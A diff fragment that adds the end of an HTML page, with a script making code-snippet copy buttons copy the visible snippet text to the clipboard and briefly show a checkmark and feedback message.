+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+
+
+</html>
